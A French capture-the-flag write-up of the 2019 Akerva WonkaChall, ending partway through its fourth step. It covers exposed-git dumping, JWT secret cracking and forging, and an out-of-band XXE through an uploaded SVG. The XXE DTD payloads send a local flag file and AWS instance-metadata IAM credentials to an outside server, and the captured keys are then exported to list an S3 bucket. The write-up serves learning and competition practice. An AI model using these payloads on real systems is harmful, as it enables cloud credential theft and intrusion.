---
author: "Maki"
title: "WonkaChall 2019"
slug: "wonkachall2019"
date: 2019-07-20
description: "Challenge from Akerva (french cybersecurity company), deal with Web, Active Directory and Linux stuff."
toc: true
---

## Introduction

Le Wonka Challenge est une épreuve réalisé par [Akerva](https://akerva.com/), une société de cybersécurité française, contenant 13 flags. Ce challenge a été déployé à [LeHack](https://lehack.org/en) 2019, une conférence de cybersécurité française.

Dans ce challenge on va retrouver plusieurs parties :

1. Web
2. Active Directory
3. Linux LAN

Ce challenge était vraiment intéressant, j'ai appris pas mal de trucs, notamment sur la partie Active Directory. C'est assez rare d'avoir un challenge avec du Windows à cause des licences. Le writeup sera plutôt long, donc je vais faire des TL;DR et les liens vers les différentes ressources utiles pour chaque sections.

J'espère que vous allez autant avoir de fun à lire ce writeup que moi à faire le challenge!

Le point d'entré du challenge se trouve avec ce lien : https://willywonka.shop

![](https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif)

## Step 1 - Developper's mistake

> Let's start easy, what are the latest changes to the website ?

![](https://media.giphy.com/media/ES9V2TWfWOcaQ/source.gif)

### TL;DR

1. Faire un dirsearch et trouver un dossier `.git`
2. Utiliser `GitTools -> dumper -> extractor` pour récupérer le git et les anciens commit
3. Le premier flag se situe dans le fichier `.git/COMMIT_EDITMSG`

---

### Directory listing

![azazaza](/img/writeups/wonkachall2019/step1_index.png)
_Fig 1_ : Index of the website

Première chose que je fais en arrivant sur un site, c'est de lancer un `dirsearch`. Le wordlist par défaut est vraiment pertinente, en général ce qu'elle sort se transforme en quick win et en plus il est plutôt rapide.

```bash
➜  dirsearch git:(master) ./dirsearch.py -u https://willywonka.shop/ -e .html,.php,.txt           

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: .html, .php, .txt | HTTP method: get | Threads: 10 | Wordlist size: 6878

Error Log: /opt/t/dirsearch/logs/errors-19-07-21_01-29-23.log

Target: https://willywonka.shop/

[01:29:23] Starting: 
[01:29:23] 400 -  166B  - /%2e%2e/google.com
[01:29:23] 308 -  263B  - /.git
[01:29:23] 200 -  973B  - /.git/
[01:29:23] 200 -  449B  - /.git/branches/
[01:29:23] 200 -  130B  - /.git/COMMIT_EDITMSG
[01:29:23] 200 -    1KB - /.git/hooks/
[01:29:23] 200 -  276B  - /.git/config
[01:29:23] 200 -  495B  - /.git/info/
[01:29:24] 200 -   73B  - /.git/description
[01:29:24] 200 -   23B  - /.git/HEAD
[01:29:24] 200 -  240B  - /.git/info/exclude
[01:29:24] 200 -  542B  - /.git/logs/
[01:29:24] 200 -    2KB - /.git/index
[01:29:24] 200 -  355B  - /.git/logs/HEAD
[01:29:24] 200 -  528B  - /.git/logs/refs/heads
[01:29:24] 200 -  355B  - /.git/logs/refs/heads/master
[01:29:24] 200 -  504B  - /.git/logs/refs
[01:29:24] 200 -    2KB - /.git/objects/
[01:29:24] 200 -   41B  - /.git/refs/heads/master
[01:29:24] 200 -  545B  - /.git/refs/
[01:29:24] 200 -  508B  - /.git/refs/heads
[01:29:24] 200 -  445B  - /.git/refs/tags
[01:29:35] 200 -    5KB - /login
[01:29:35] 302 -  209B  - /logout  ->  http://willywonka.shop/
[01:29:37] 500 -  290B  - /profile
[01:29:38] 200 -    4KB - /register
[01:29:38] 200 -    4KB - /reset
[01:29:39] 302 -  265B  - /submit  ->  http://willywonka.shop/profile?filetype=image%2Fpng

Task Completed
```

On voit donc un fichier `.git`, avec `GitTools` il est possible de dump le commit présent.

### Git dumping

Pour récupérer l'intégralité du `git`, on va d'abord utiliser le script `gitdumper.sh` puis le `extractor.sh` pour récupérer les différents commits.

```bash
➜  wonkachall2019 git:(master) ✗ mkdir out_dump  

➜  wonkachall2019 git:(master) ✗ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ out_dump
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[+] Creating a/.git/
[+] Downloaded: HEAD
[...]

➜  wonkachall2019 git:(master) ✗ mkdir out_extract

➜  wonkachall2019 git:(master) ✗ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh out_dump out_extract                         
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: 8cda59381a6755d33425cb4ccddcc011a85649c6
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/.env
[...]
[+] Found commit: 7a1756aae221342ab09f9101358201bbfa70a702
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/.env
[...]
```

### Flag

```bash
➜  wonkachall2019 git:(master) ✗ ls
  a    b    img    README.md    step1.md
➜  wonkachall2019 git:(master) ✗ cd a/.git                    
➜  .git git:(master) ls
  COMMIT_EDITMSG    config    description    HEAD    index    info    logs    objects    refs
➜  .git git:(master) cat COMMIT_EDITMSG 
Added debug mode with "debug=1" GET param

A wild flag appears !
16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009
```

> 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009

---

### Resources

1. __maurosoria__, _dirsearch_, GitHub : https://github.com/maurosoria/dirsearch 
2. __internetwache__, _GitTools_, GitHub : https://github.com/internetwache/GitTools

## Step 2 - A tale of JWT

>  A ticket 'deadbeef' was submitted. Who's the victim ? 

![](https://media.giphy.com/media/UtPXYALLCey0SKFd4r/giphy.gif)

### TL;DR

1. Faire de l'audit de code grâce au `.git` trouvé dans l'étape d'avant, trouver le `debug=1` dans la config de Symphony
2. Mettre la page `/reset` en debug nous permet de récupérer une stacktrace : `https://willywonka.shop/reset?debug=1`
3. Dans la stacktrace on trouve un sous domaine (`backend.willywonka.shop`) et un JSON Web Token (JWT)
4. Il existe une autre page `/reset` sur le backend. Grâce à cette page, on sait que le site attend un JWT dans le cookie `backend-session`
5. Analyse du JWT récupéré dans la stacktrace et voir qu'il est protégé par une clé secrète (HS256)
6. Le bruteforcer avec `rockyou` et trouver la clé `s3cr3t` 
7. Forger un nouveau token avec un utilisateur valide (`aas`) et une expiration lointaine, ça donne la requête :`https://backend.willywonka.shop/reset/jwt_craft ` . La liste des comptes se trouve sur la page d'accueil du frontend.
8. Une fois la mire d'authentification terminé, chercher le ticket `deadbeef`

---

### Directory listing

Dans le `dirsearch` fait précédemment, si on enlève le `.git` il reste :

```bash
[11:10:46] 200 -    5KB - /login
[11:10:47] 302 -  209B  - /logout  ->  http://willywonka.shop/
[11:10:51] 500 -  290B  - /profile
[11:10:52] 200 -    4KB - /register
[11:10:52] 200 -    4KB - /reset
[11:10:55] 302 -  265B  - /submit  ->  http://willywonka.shop/profile?filetype=image%2Fpng
```

### User enumeration

En utilisant l'application, j'ai remarqué qu'il était possible de faire de l'énumération d'utilisateur :

![](/img/writeups/wonkachall2019/step2_unable_to_find_user.png)
_Fig 2_ : Unable to find user

Pour tester la théorie de l'énumération d'utilisateurs, j'ai pris la wordlist des usernames de seclist et passé dans intruder (vu la taille de la wordlist, la version gratuite de burp est largement suffisante).

![](/img/writeups/wonkachall2019/step2_intruder.png)
_Fig 3_ : User enumeration

Donc si un utilisateur est valide, le serveur renvoi une erreur 500... A savoir aussi que ce bruteforce d'utilisateur ne sert __à rien__ et m'a même fait perdre du temps par la suite. La liste des utilisateurs peut être trouvée sur l'index du site :

![](/img/writeups/wonkachall2019/step2_users_list_index.png)
_Fig 4_ : User enumeration

Les utilisateurs sont donc :

* n0wait
* qsec
* cybiere
* meywa
* itm4n
* aas
* xXx_d4rkR0xx0r_xXx

### Don't forget the git

Maintenant qu'on a récupéré des utilisateurs, mais vu que le serveur renvoi unr erreur 500, on est pas beaucoup plus avancé. Il ne faut donc pas oublier de fouiller le git. On trouve une variable get `/?debug=1`

```bash
➜  out_extract cat 0-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml 
#index:
#    path: /
#    controller: App\Controller\DefaultController::index
debug:
    path: /?debug=1
    controller: #TODO#
```

J'ai perdu pas mal de temps à comprendre pourquoi ça ne fonctionnait pas sur la route principale. Au final, j'ai mis l'utilisateur valide `aas` dans le formulaire de reset et ajouté le paramètre avant l'envoi du formulaire. Le retour est très intéressant, car on peut voir le stacktrace de l'application :

![](/img/writeups/wonkachall2019/step2_stacktrace.png)
_Fig 5_ : Stacktrace de l'application

> https://willywonka.shop/reset?debug=1

```json
Fatal error: Uncaught exception 'Swift_TransportException' with message 'Expected response code 354 but got code "566", with message "566 SMTP limit exceeded"' in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php:386

Stack trace:
#0 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(281): Swift_Transport_AbstractSmtpTransport->_assertResponseCode('566 SMTP limit ...', Array)
#1 /usr/local/lib/php/Swift/Transport/EsmtpTransport.php(245): Swift_Transport_AbstractSmtpTransport->executeCommand('DATA\r\n', Array, Array)
#2 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(321): Swift_Transport_EsmtpTransport->executeCommand('DATA\r\n', Array)
#3 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(432): Swift_Transport_AbstractSmtpTransport->_doDataCommand()
#4 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(449): Swift_Transport_AbstractSmtpTransport->_doMailTransaction(Object(Swift_Message), 'support@songboo...', Array, Array)
#5 /usr/local/lib/php/Swift/Transport/Abstra in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php on line 386

While trying to send:
{
    "dest":['test'],
    "object":'Password reset instructions for WillyWonka Shop',
    "from":'admin@wwonka.shop',"relay":'backend.willywonka.shop',
    "content-html":'
        <html>
            <head>
                <meta http-equiv="content-type" content="text/html; charset=UTF-8">
                <title></title>
            </head>
            <body text="#000000" bgcolor="#FFFFFF">
                <b>Hello dear associate,</b><br>
                <br>
                You are receiving this mail after a password reset request has been
                submitted on Willy Wonka Golden Ticket Shop. <br>
                <br>

                In order to reset your password, please use this login link and
                reset your password from your profile <br>
                <br>
                <i><font size="+3"><a moz-do-not-send="true"
                href="http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o">Reset my password</a></font></i><br>
                <br>
                <i><b>Note : if you didn't request this email, please ensure your
                account hasn't been accessed and perform any relevant security
                hardening.</b></i><br>
                <br>
                Have a nice day<br>
                <br>
                Willy Wonka<br>
                <a moz-do-not-send="true" href="http://willywonka.shop/">/</a><br>
            </body>
        </html>',
    "content-text":'
        Hello dear associate,
        
        You are receiving this mail after a password reset request has been submitted on Willy Wonka Golden Ticket Shop.
        
        In order to reset your password, please use this login link and reset your password from your profile
        
        http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
        
        Note : if you didn't request this email, please ensure your account hasn't been accessed and perform any relevant security hardening.
        
        Have a nice day
        
        Willy Wonka
        http://willywonka.shop/'
}

Find more documentation here :
https://google.fr
https://stackoverflow.com
https://lmgtfy.com
```

Les informations intéressantes ici sont donc :

```
* backend.willywonka.shop

* eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
```

### Dirsearch on backend

Nouvel hote ou nouveau site web dans le test d'intrusion, signifie qu'on reprend la recon depuis le départ :

```bash
➜  wonkachall2019 git:(master) ✗ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx -t 25 | grep -v 403

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: do, java, action, db, sql, ~, xml, pdf, jsp, php, old, bak, zip, tar, asp, aspx, txt, html, xsl, xslx | HTTP method: get | Threads: 25 | Wordlist size: 13259

Error Log: /opt/t/pentest/recona/dirsearch/logs/errors-19-07-09_11-44-07.log

Target: https://backend.willywonka.shop

[11:44:07] Starting: 
[11:44:07] 400 -  166B  - /%2e%2e/google.com
[11:44:32] 200 -    2KB - /login
[11:44:33] 302 -  219B  - /logout  ->  http://backend.willywonka.shop/login
[11:44:37] 302 -  219B  - /reset  ->  http://backend.willywonka.shop/login
```

Le `grep -v 403` c'était pour virer les 403, il y en avait trop. Donc dans le dirsearch, les résultats sont relativement équivalents au frontend, sauf que tout est redirigé vers une page de `/login`. Le truc intéressant c'est qu'on voit que l'application attend un JSON Web Token :

![](/img/writeups/wonkachall2019/step2_backend_jwt.png)
_Fig 6_ : backend-session cookie

Le token contient : 

> eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIk5vIHRva2VuIHByb3ZpZGVkIl19XX0.XSRiRw.QMJ9BsJX127QbsE-FgmcvQm-uBM

```json
{
  "_flashes": [
    {
      " t": [
        "message",
        "No token provided"
      ]
    }
  ]
}

{}
```

### Cracking the JWT secret

Donc on a l'application frontend qui nous délivre un JWT et le backend qui en attend un. Il y a quelque chose à jouer !

Le token de l'utilisateur `aas` quand je veux reset en debug :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2NDMxNSwiZXhwIjoxNTYyNjk0MzE1fQ.6yuVpu_jugKOZL9p9-M-wAF6knpArUJqnfgQzS4W9N4
```

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "aas",
  "aud": "frontend.willywonka.shop",
  "iat": 1563668653,
  "exp": 1563669253
}
```

Le but ici va être de changer la partie `aud` pour faire un token pour le backend et le `exp` pour ne pas être dérangé par l'expiration du token. Pour modifier un JWT en `HS256`, il faut d'abord récupérer la clé secrète pour signer le token. On va donc le bruteforce :

```bash
➜  jwt_tool git:(master) python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 

,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
----''----''----''----''----''----''----''----''----''----'
     ,--.,--.   ,--.,--------.,--------.             ,--.
     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
 `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
'----''----''----''----''----''----''----''----''----''----'

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] sub = test
[+] aud = frontend.willywonka.shop
[+] iat = 1562664315
[+] exp = 1562664915

######################################################
# Options:                                           #
# 1: Check CVE-2015-2951 - alg=None vulnerability    #
# 2: Check for Public Key bypass in RSA mode         #
# 3: Check signature against a key                   #
# 4: Check signature against a key file ("kid")      #
# 5: Crack signature with supplied dictionary file   #
# 6: Tamper with payload data (key required to sign) #
# 0: Quit                                            #
######################################################

Please make a selection (1-6)
> 5

Loading key dictionary...
File loaded: /opt/t/bf/rockyou.txt
Testing 14344380 passwords...
[+] s3cr3t is the CORRECT key!
```

Le nouveau token va avoir les options suivantes :

* aud : backend.willywonka.shop
* exp : 1999999999 -> On est tranquille jusqu'en 2033

![](/img/writeups/wonkachall2019/step2_jwtcrafted.png)
_Fig 7_ : New token

Avec ce nouveau token, on accède au backend de l'application :

```
https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2OTkxMiwiZXhwIjoxOTk5OTk5OTk5fQ.pZxLNOIrI1DCRdB-MBWDNtDnmeKeANTNm5btAoY6Pmw
```

Il ne nous reste plus qu'à récupérer le ticket `deadbeef` pour récupérer le second flag.

![](/img/writeups/wonkachall2019/step2_auth_bypassed.png)
_Fig 8_ : Second step flag

### Flag

> 7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318

---

### Resources

1. __danielmiessler__, _SecLists - top-usernames-shortlist.txt_, GitHub : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
1. __Auth0__, _JSON Web Token debugger_, jwt : https://jwt.io/
2. __ticarpi__, _jwt\_tool_, GitHub : https://github.com/ticarpi/jwt_tool

## Step 3 - Simple XXE OOB

> There's a flag.txt at the server root 

![](/img/writeups/wonkachall2019/oob_xxe_dbz.png)

### TL;DR

1. Forger une XXE OOB via fichier SVG : [rest.svg](./step3/rect.svg)
2. Uploadant le fichier [ro.svg](./step3/ro.svg) à l'adresse : `http://willywonka.shop/profile?filetype=image%2fsvg%2bxml`
3. Mettre `aas` en nom de victime et de la donnée random pour le reste
4. Récupérer l'id du ticket et y accéder dans le backend
5. Cliquer sur `autoresize` pour déclencher la XXE OOB et récupérer le flag

---

### State of the art

Ayant découvert le hint directement, je savais que je cherchais une XXE via un SVG. Ici, il va falloir upload un SVG sur le frontend et y accéder via le backend avec l'id du ticket.

Comme vu précédemment, le lien de reset récupéré sur le frontend nous donne accès au formulaire d'upload en étant authentifié.

![](/img/writeups/wonkachall2019/step3_frontendform.png)
_Fig 9_ : Frontend upload form

De base l'url est la suivante : `https://frontend.willywonka.shop/profile?filetype=image%2Fpng`

Le truc intéressant ici est le paramètre `filetype` qui contient le mime type du fichier que l'on veut envoyer. Etant donné qu'on veut faire une XXE OOB via SVG, notre mime type sera donc : `image%2fsvg%2bxml`

Pour les retardataires du fond, une XXE OOB est comme une "blind" XXE. On va upload un premier fichier XML (dans notre cas, un fichier SVG contenant du XML) contenant une ressource externe, herbergée un serveur maîtrisé. Une fois qu'on déclenche la XXE, alors le DTD externe est appelé et les entités de ce DTD aussi. C'est à ce moment là qu'on va faire de l'exfiltration de données.

![](/img/writeups/wonkachall2019/step3_xxe_oob_nutshell.png)
_Fig 10_ : XXE OOB in a nutshell

J'ai déjà parlé de XXE OOB lors du [Santhacklaus](/walkthrough/santhacklaus2018/#archdrive-4-3), j'ai utilisé un serveur externe, mais il est possible de jouer avec deux ngrok.

### Exploitation

Si vous avez bien suivi l'explication précédente, on va générer plusieurs fichiers :

* ro.svg : Le SVG contenant le stage 1 de l'attaque

```xml
<!DOCTYPE svg [
<!ENTITY % file SYSTEM "http://51.158.113.8/ro.dtd">
%file;%template;
]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="30">Injected: &res;</text>
</svg>
```

* ro.dtd : La vraie charge, pour récupérer les données souhaitées

```xml
<!ENTITY % secret1 SYSTEM "file:///flag.txt">
<!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
```

Donc maintenant il suffit d'uploader notre `ro.svg` :

![](/img/writeups/wonkachall2019/step3_frontend_form_filled.png)
_Fig 11_ : Frontend filled form

Une fois le svg uploadé, il suffit d'y accéder via l'id du ticket. Pour déclencher la XXE, il faut cliquer sur `Autoresize` le résultat s'affiche :

![](/img/writeups/wonkachall2019/step3_flag.png)
_Fig 12_ : Backend ticket

Une vraie XXE OOB n'aurait pas de retour, m'enfin, on va pas se plaindre. On peut donc afficher le contenu des fichiers, tant qu'on connait le chemin et que notre utilisateur a les droits.

### Flag

> 0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630

---

### Resources

1. __alexbirsan__, _LFI and SSRF via XXE in emblem editor_, HackerOne : https://hackerone.com/reports/347139
2. __Ian Muscat__, _Out-of-band XML External Entity (OOB-XXE)_, Acunetix : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/

## Step 4 - SSRF to KFC

>  Lets check this bucket ! 

![](https://media.giphy.com/media/in4t9IzuZKhqg/giphy.gif)

### TL;DR

1. Grâce à l'indice d'Akerva, on sait qu'il faut jouer avec du AWS S3 Bucket
2. Avec la XXE OOB, on peut récupérer les identifiants à l'adresse : `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Récupérer les informations du bucket : `http://169.254.169.254/latest/dynamic/instance-identity/document`
3. Initialiser les variables d'environnements avec les informations trouvées pour se connecter `AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN`
4. Lister le contenu du bucket : `aws s3 ls s3://willywonka-shop`
5. Récupérer le flag : `aws s3 cp s3://willywonka-shop/Flag-04.txt .`

---

### State of the art

D'après l'énoncé, il y a une histoire de bucket, ma première pensé a donc été bucket s3 de amazon. C'est la première fois que j'ai à jouer avec cette techno, j'avais lu pleins d'articles mais jamais expérimenté. C'est cool ! :D

Cependant, le premier reflexe a été de récupérer le `.bash_history`, voici les commandes intéressantes :

```bash
[...]
sudo vim flag.txt 
exit 
curl 
curl http://169.254.169.254/latest/meta-data/ 
curl 
curl http://169.254.169.254/latest/meta-data/iam 
curl 
curl http://169.254.169.254/latest/meta-data/iam/ 
curl 
curl http://169.254.169.254/latest/meta-data/iam/info 
curl 
curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3 
curl 
curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ 
curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ 
ifcondfig 
ifconfig 
ping frontend-prod 
nc -vz 172.31.46.235 3306 
nc -vz 172.31.46.235 22 
nc -vz 172.31.46.235 3306 
nc -vz 172.31.46.235 3304 
nc -vz 172.31.46.235 3306 
ls 
cd back/ 
ls 
grep -nRi "test/" 
nano -c app.py 
ls 
sudo systemctl restart backend 
grep -nRi "
```

La première chose est d'utiliser la XXE pour taper sur l'IP d'Amazon et récupérer les informations du bucket, on a le lien dans le bash_history : `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/`

### Exploitation

Il suffit de modifier le `file:///flag.txt` de `ro.dtd` et ça nous donne :

```xml
<!ENTITY % secret1 SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/">
<!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
```

output :

```json
{
   "Code":"Success",
   "LastUpdated":"2019-07-10T14:45:25Z",
   "Type":"AWS-HMAC",
   "AccessKeyId":"ASIAZ47IG35A4F6ZY2ML",
   "SecretAccessKey":"bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn",
   "Token":"AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs4Xo6Ox8wqJ9vx7ritNzGavwTS/rI7oQIhAKHhe+WXRJ9A8dLuuunqa2NjyPCv+5/dIN9StNiRBx2yKt0DCJD//////////wEQABoMNjgwNzAyNDM1MTM3IgyHWN57wifuAe4thUgqsQMHVS0TSrUwnUusyltHD8RPZSgtTLPFEH4k0YUBo2lvHDYz5MQcvRh4RUw/+ZPjmMwHuDZd/AffNRdKjxr3AnnB8MVqKoPBnfCYkhm+JCRpnGaMcYWaGLZ45Dd0ljfd+KkqJ37VmAeTOqZ8pMsGoWxNtwOC+msVXp750tCHNEfRNO4o71+9BR7quq5VO9QSy1eSusZQTfdfA4cPsaEBGhR5cj7Eu1OXL1bsBoWbYAmBKfah+2cDs1FVGThQS7DcdpQ8KBMuLDeXrG7EtQNCiIuHPRuDYwoDfePJSXf7W/HIsIqfBAL1JH9jtmHgVmBP97/LfRKuL9BmT3V0UAYx0sxllW0d3kR0Rgy86zeMUaMu6NHIPr8DUmhQ80/dfrTgD2J+2OcUu/KtuwKJNUMSru12g7nzbN2zmJHPkH5bD16naiDm9AOkqRb2w2Y74r3T9oFidn8Rmo23nSwaLVPsDNal6CVA+VbnBR/Sv0gLXqIJyO95KHbXBgviYgXFj17QgnWFtbebSV2th8K8NGA1NPYMQaNes9+WNMBrv97yYmaKOHddw4u2BRjm9hGVLzJokQJHMNjzl+kFOrMBOd494LX2BWDzWFLKJqbWE09kCrZlkGP80If+mKxrV6saMDPPpWPgYnKkft8CgH7J/SMDOqkLHhwzkuIK+Mrt8CulbshV/K8v9CLWAbi303wblb69FYPa8xZsBAjORagjrfUVfXUC5EBSCWiL1mVYZCdU7Nu0gJlauV9MwSHde1iQkVaokruWs/dBd6QajFdseSnCgLvy+MX/oE+novoCwWG5oew2GxwA7ZZKUj4E5gGbPEA=",
   "Expiration":"2019-07-10T20:55:48Z"
}
```

Pour accéder à un bucket s3, il ne suffit pas d'avoir l'accesskey et le secret, il faut aussi la zone utilisée :

```xml
<!ENTITY % secret1 SYSTEM "http://169.254.169.254/latest/dynamic/instance-identity/document">
<!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
```

output :

```json
{
   "devpayProductCodes":null,
   "marketplaceProductCodes":null,
   "accountId":"680702435137",
   "availabilityZone":"eu-west-3c",
   "ramdiskId":null,
   "kernelId":null,
   "pendingTime":"2019-07-04T16:23:26Z",
   "architecture":"x86_64",
   "privateIp":"172.31.39.217",
   "version":"2017-09-30",
   "region":"eu-west-3",
   "imageId":"ami-0119667e27598718e",
   "billingProducts":null,
   "instanceId":"i-0defb90fb5aafe95b",
   "instanceType":"t2.medium"
}
```

Maintenant nous avons toutes les informations pour se connecter au bucket s3. Il ne nous reste plus qu'à initialiser les différentes variables d'environnement.

### Connexion au bucket s3

```bash
export AWS_ACCESS_KEY_ID=ASIAZ47IG35A57E4JGVL
export AWS_SECRET_ACCESS_KEY=44tVG3Dv0xhPslIR52Fwmk6Vo5iwmof/EEIQF3aQ
export AWS_DEFAULT_REGION=eu-west-3
export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDkaCWV1LXdlc3QtMyJGMEQCIGmZTy1kpupPx9pOZGQ4d4pyTs0J/1NlHz4FBmd20XlOAiB6THoIFFw+wMoOQru3UoiEEzFybPv6Rr589TKaKGfjMSrdAwii//////////8BEAAaDDY4MDcwMjQzNTEzNyIMXgOibqCvChZ3RNFWKrED35t3r32Ff40kXU7sacZz1AB4V2KUQLQgBch26QfsJ8QW1WJcs21SnqtcJA6Fw5UxAmWk2PKrrIHRZcjmFH0dFsMnQ838ZY/HyPPhDdX60WZC5Czxect7sXkWDHLJK0ZQtSx3rT/TmANLoySZxD0DX5J+HNIISsmwaCx6omr/8TzpL7ZY2kXkWw/CLLYQIc/71NWO4IUOO+4Q9kdhwa1NzwX7CIoPQHG5ICX1i7Z3LnmuiLLsYgSxhY3Ne6TyIbt8gMHusVTAycltqjS5NcAxKstLrnqNMpYZ+WO4kwaKJSNCtLhb+cn98OihfsWECa3T9eaFcpqkGrhL8QkDgucb7XJNKiV7tkV8Qmp0ajtWLaBNqf0IBs1Xem/+H/KeRAMINVeNu6JXxD/5NjmjDo/umecpMlw3lXfX8Kd+LsXjKs2HDVr5QwLr+q8SF4W8vGFbq88U3blTXJ+jtvKpnOFB/QZy9cmEE/s5pD0PEc75VFnbGRcJYZjFzYQcttoW+YcjxaHHIpg41KWURYs9cV5TnAWViNAQk/CvP0Jj44zR7ixB/DHZW2Viw1+erIHLxWf8ZzDw1NDpBTq1AdGK7QkjqfH40mkHEcZBCaiKEl3CYU3G+jLsGkOeV9+m1254Yn3RWKlwISPbYFdg6W69jqvLd7wrtr1AU68rAl7LMZsiDCQGQ3gSSUOvNuQA9dVyZHd4gLptKgobAhDTt92dGI9553Tl5JwL2457IcJ0NtO2Nwa2AvoG1QUfxoSWg6nxJpFtexZyFm3rceEPHyXffuBsH+r3zuFUAklQ9/UYxLCMWi4Nq4ltYx99+Jd+R4aIYR4=

➜ aws s3 ls                                      
2019-07-04 18:41:42 willywonka-shop
```

### Get files

Il ne nous reste plus qu'à ce servir dans ce bucket :

```bash
➜ aws s3 ls                      
2019-07-04 18:41:42 willywonka-shop

➜ aws s3 ls s3://willywonka-shop/
                           PRE images/
                           PRE tools/
2019-07-05 13:54:47         65 Flag-04.txt

➜ aws s3 ls s3://willywonka-shop/tools      
                           PRE tools/

➜ aws s3 ls s3://willywonka-shop/tools/     
                           PRE docs/
                           PRE vpn/
2019-07-05 10:15:18          0 

➜ aws s3 ls s3://willywonka-shop/tools/docs/
2019-07-05 13:15:12          0 
